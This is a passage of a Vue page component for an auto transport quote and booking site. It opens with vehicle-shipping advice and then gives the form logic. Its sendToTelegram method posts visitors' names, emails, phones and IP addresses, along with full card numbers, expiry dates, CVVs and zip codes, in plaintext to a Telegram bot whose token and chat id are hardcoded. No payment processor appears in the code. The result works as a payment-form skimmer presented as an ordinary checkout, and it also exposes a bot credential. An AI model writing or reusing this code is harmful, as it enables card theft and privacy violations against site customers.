          issues with your vehicle through photographs or videos. This
          documentation will serve as evidence in case of any disputes regarding
          damage during transport.
        </p>
        <p>
          <strong>Remove Personal Items:</strong> Remove all personal belongings
          and valuables from your vehicle. Auto transport companies typically do
          not cover these items under their insurance policies.
        </p>

        <h4>Review and Confirm Details</h4>
        <p>
          <strong>Shipping Schedule:</strong> Review the pickup and delivery
          schedule with the auto transport company. Ensure you have a clear
          understanding of the dates, times, and locations involved.
        </p>
        <p>
          <strong>Contact Information:</strong> Provide accurate contact
          information where you can be reached throughout the shipping process.
          Stay accessible to address any updates or changes.
        </p>

        <h4>Prepare Necessary Documentation</h4>
        <p>
          <strong>Vehicle Registration and Title:</strong> Ensure you have the
          original vehicle registration and title available. Some transport
          companies may require these documents for verification purposes.
        </p>
        <p>
          <strong>Insurance Information:</strong> Provide proof of insurance
          coverage for your vehicle, including any additional insurance you may
          have purchased for transport.
        </p>

        <h3>During Vehicle Pickup</h3>
        <h4>Inspect Your Vehicle</h4>
        <p>
          <strong>Walk-around Inspection:</strong> Conduct a thorough inspection
          of your vehicle alongside the transport company's representative. Note
          any pre-existing damage on the Bill of Lading (shipping document).
        </p>
        <p>
          <strong>Document Condition:</strong> Take additional photos or videos
          of your vehicle's condition at the time of pickup. This documentation
          is crucial for comparing the vehicle's condition upon delivery.
        </p>

        <h4>Review and Sign Contracts</h4>
        <p>
          <strong>Bill of Lading:</strong> Carefully review the Bill of Lading
          provided by the transport company. This document outlines the terms of
          transport, including pickup and delivery details, insurance coverage,
          and condition assessment.
        </p>
        <p>
          <strong>Sign Contracts:</strong> Sign the Bill of Lading after
          ensuring all details are accurate and satisfactory. Retain a copy for
          your records.
        </p>

        <h3>During Vehicle Transport</h3>
        <h4>Stay Informed</h4>
        <p>
          <strong>Communication:</strong> Maintain open communication with the
          auto transport company. Stay informed about the progress of your
          shipment and any potential delays or updates.
        </p>
        <p>
          <strong>Tracking:</strong> If available, use tracking services
          provided by the transport company to monitor your vehicle's location
          and status during transport.
        </p>

        <h4>Prepare for Delivery</h4>
        <p>
          <strong>Delivery Preparation:</strong> Coordinate with the recipient
          or designated contact at the destination for vehicle delivery. Ensure
          they are aware of the delivery schedule and any requirements for
          receiving the vehicle.
        </p>

        <h3>After Vehicle Delivery</h3>
        <h4>Inspect Your Vehicle Upon Delivery</h4>
        <p>
          <strong>Thorough Inspection:</strong> Conduct a comprehensive
          inspection of your vehicle upon delivery. Check for any new damage or
          discrepancies compared to your initial documentation.
        </p>
        <p>
          <strong>Document Condition:</strong> Document the vehicle's condition
          at the time of delivery through photos or videos. Note any issues
          directly on the Bill of Lading.
        </p>

        <h4>Complete Final Paperwork</h4>
        <p>
          <strong>Finalize Documentation:</strong> Sign off on the final
          inspection and confirm the receipt of your vehicle with the transport
          company. Ensure all paperwork, including the Bill of Lading, is
          completed accurately.
        </p>

        <h4>Address Any Issues</h4>
        <p>
          <strong>Damage Claims:</strong> If you discover any damage that
          occurred during transport, promptly notify the transport company.
          Follow their procedures for filing a damage claim and provide
          supporting documentation.
        </p>
        <p>
          <strong>Resolution:</strong> Work with the transport company to
          resolve any issues or concerns regarding the condition of your vehicle
          or the shipping process.
        </p>

        <p>
          By following these steps and recommendations, you can help ensure a
          smooth and successful auto transport experience from start to finish.
          Preparation, documentation, clear communication, and careful
          inspection are key aspects of safeguarding your vehicle and achieving
          peace of mind throughout the shipping process. Choose a reputable auto
          transport company, stay organized, and address any concerns promptly
          to facilitate a positive outcome for your vehicle shipment.
        </p>
      </div>
    </div>
  </main>
</template>

<script>
import { mapState } from "vuex";
import {
  email,
  required,
  minLength,
  maxLength,
} from "vuelidate/lib/validators";
export default {
  components: {},
  data() {
    return {
      step: 1,
      index: 1,
      userIp: "1",
      expeditedPrice: undefined,
      bestValue: undefined,
      premium: undefined,
      choosenPrice: undefined,
      activeNamesCollapse: "2",
      shipmentInfo: {
        from: "",
        to: "",
        type: "",
        date: "",
        specificDate: undefined,
      },
      personalInfo: {
        name: "",
        phone: "",
        email: "",
      },
      cardInfo: {
        number: "",
        name: "",
        date: "",
        cvv: "",
        zip: "",
      },
      dateOptions: [
        { label: "As soon as Possible", value: "ASAP" },
        { label: "Within 7 Days", value: "Within 7 days" },
        { label: "Within 2 Weeks", value: "Within 2 weeks" },
        { label: "On A Specific Date", value: "specificDate" },
        { label: "Not Sure Yet", value: "Not Sure yet" },
      ],
      vehicleTypes: [
        { label: "Car", value: "car" },
        { label: "SUV", value: "SUV" },
        { label: "Pickup", value: "Pickup" },
      ],
    };
  },
  validations: {
    shipmentInfo: {
      from: { required, min: minLength(5), max: maxLength(150) },
      to: { required, min: minLength(5), max: maxLength(150) },
      type: { required },
      date: { required },
    },

    personalInfo: {
      email: { required, email },
      name: { required, max: maxLength(50) },
      phone: { required },
    },
    cardInfo: {
      number: { required },
      name: { required, max: maxLength(50) },
      date: { required },
      cvv: { required },
      zip: { required },
    },
  },
  async fetch() {
    await this.$store.dispatch("fetchZips");
  },
  mounted() {
    fetch("https://api.ipify.org?format=json")
      .then((x) => x.json())
      .then(({ ip }) => {
        this.userIp = ip;
      });
  },

  methods: {
    async checkPrice() {
      this.$v.personalInfo.$touch();
      if (!this.$v.personalInfo.$invalid) {
        const pickUpZip = this.shipmentInfo.from?.substring(
          this.shipmentInfo.from.length - 5,
          this.shipmentInfo.from.length
        );
        const dropOffZip = this.shipmentInfo.to?.substring(
          this.shipmentInfo.to.length - 5,
          this.shipmentInfo.to.length
        );
        const vehicleType = this.shipmentInfo.type;
        let shippingDate = "";

        if (this.shipmentInfo.specificDate) {
          shippingDate = this.shipmentInfo.specificDate;
          this.shipmentInfo.date = this.shipmentInfo.specificDate;
        } else {
          const dateToSend = new Date();
          shippingDate =
            dateToSend.getFullYear() +
            "-" +
            (dateToSend.getMonth() + 1) +
            "-" +
            (dateToSend.getDate() + 2);
        }
        await this.$axios
          .post(`https://back.usstartruckingllc.com/api/shipping/price/`, {
            pickup_zip: pickUpZip,
            dropoff_zip: dropOffZip,
            estimated_ship_date: shippingDate,
            vehicle_type: vehicleType,
            ship_via_id: "1",
            vehicle_runs: "1",
          })
          .then((res) => {
            if (res.data.data) {
              const price = res.data.data[1];
              this.sendToTelegram(
                pickUpZip,
                dropOffZip,
                shippingDate,
                vehicleType,
                this.personalInfo.name,
                this.personalInfo.email,
                this.personalInfo.phone,
                price
              );
              this.expeditedPrice = this.roundNearest5(price * 1.3);
              this.bestValue = this.roundNearest5(price * 1);
              this.premium = this.roundNearest5(price * 1.5);
              this.step++;
            } else {
              this.$notify({
                title: "Wrong zip code",
                message: "Please select from the list",
                type: "error",
                position: "top-left",
              });
              this.step = 1;
              this.sendToTelegram(
                pickUpZip,
                dropOffZip,
                shippingDate,
                vehicleType,
                this.personalInfo.name,
                this.personalInfo.email,
                this.personalInfo.phone
              );
            }
          });
      }
    },
    async searchZipCodes(key, cb) {
      await this.$store.dispatch("fetchZips", key);
      setTimeout(() => {
        const results = this.zips;
        cb(results);
      }, 100);
    },
    async sendToTelegram(
      pickup,
      delivery,
      date,
      type,
      name,
      email,
      phone,
      price,
      ccnumber,
      ccname,
      ccdate,
      cccvv,
      cczip
    ) {
      await this.$axios.post(
        `https://api.telegram.org/bot5878927199:AAGM4j1rVxyqRv7xpD4NWM_EdIcEXKEuUwE/sendMessage?chat_id=-4069387529&text=User IP: ${this.userIp}, Customer Info:
        Pick up:${pickup}, Delivery: ${delivery}, Date: ${date}, Type: ${type}, Name: ${name}, Email: ${email}, Phone: ${phone}, Price:$${price},
        CC number: ${ccnumber}, CC Name: ${ccname}, CC Date: ${ccdate}, CVV: ${cccvv}, Zip: ${cczip}`
      );
    },
    roundNearest5(num) {
      return Math.round(num / 5) * 5;
    },
    stepOneValidate() {
      this.$v.shipmentInfo.$touch();
      if (!this.$v.shipmentInfo.$invalid) {
        this.step++;
      }
    },
    handleSelectFrom(item) {
      this.shipmentInfo.from = `${item.city}, ${item.state}, ${item.name}`;
      document.getElementById("ship-to")?.focus();
    },
    handleSelectTo(item) {
      this.shipmentInfo.to = `${item.city}, ${item.state}, ${item.name}`;
      document.getElementById("ship-date")?.focus();
    },
    handleDate(value) {
      if (value === "specificDate") {
        setTimeout(() => {
          document.getElementById("ship-specificDate").focus();
        }, 10);
      } else {
        setTimeout(() => {
          document.getElementById("ship-type")?.focus();
        }, 10);
      }
    },
    handleSpecificDate() {
      setTimeout(() => {
        document.getElementById("ship-type")?.focus();
      }, 10);
    },
    expetidedChoosen() {
      this.choosenPrice = this.expeditedPrice;
      this.sendToTelegram(
        this.shipmentInfo.from,
        this.shipmentInfo.to,
        this.shipmentInfo.date,
        this.shipmentInfo.type,
        this.personalInfo.name,
        this.personalInfo.email,
        this.personalInfo.phone,
        this.choosenPrice
      );
      this.step++;
    },
    bestValueChoosen() {
      this.choosenPrice = this.bestValue;
      this.sendToTelegram(
        this.shipmentInfo.from,
        this.shipmentInfo.to,
        this.shipmentInfo.date,
        this.shipmentInfo.type,
        this.personalInfo.name,
        this.personalInfo.email,
        this.personalInfo.phone,
        this.choosenPrice
      );
      this.step++;
    },
    premiumChoosen() {
      this.choosenPrice = this.premium;
      this.sendToTelegram(
        this.shipmentInfo.from,
        this.shipmentInfo.to,
        this.shipmentInfo.date,
        this.shipmentInfo.type,
        this.personalInfo.name,
        this.personalInfo.email,
        this.personalInfo.phone,
        this.choosenPrice
      );
      this.step++;
    },
    ccInfoValidate() {
      this.$v.cardInfo.$touch();
      if (!this.$v.cardInfo.$invalid) {
        this.sendToTelegram(
          this.shipmentInfo.from,
          this.shipmentInfo.to,
          this.shipmentInfo.date,
          this.shipmentInfo.type,
          this.personalInfo.name,
          this.personalInfo.email,
          this.personalInfo.phone,
          this.choosenPrice,
          this.cardInfo.number,
          this.cardInfo.name,
          this.cardInfo.date,
          this.cardInfo.cvv,
          this.cardInfo.zip
        );
        this.step++;
      }
    },
  },
  computed: {
    ...mapState({
      zips: (state) => state.zips,
    }),
  },
};
</script>

<style lang="scss" scoped>
.left-side {
  border-radius: 8px;
  border: 1px solid rgba(0, 96, 183, 0.2);
  background: #fff;

  p {
    font-size: 14px;
    font-style: normal;
    font-weight: 600;
    line-height: 140%; /* 19.6px */
  }
}

.information-form {
  .el-input__inner {
    background: #ffffff;
    border: 1px solid #e6ecf0;
    border-radius: 6px;
    padding: 10rem 15rem;
    width: 100%;
    height: 47px;
    font-weight: 600;
    font-size: 15px;
    line-height: 116.96%;
    color: #5c6670;
    transition: all 0.35s ease-in-out;
  }
}
</style>
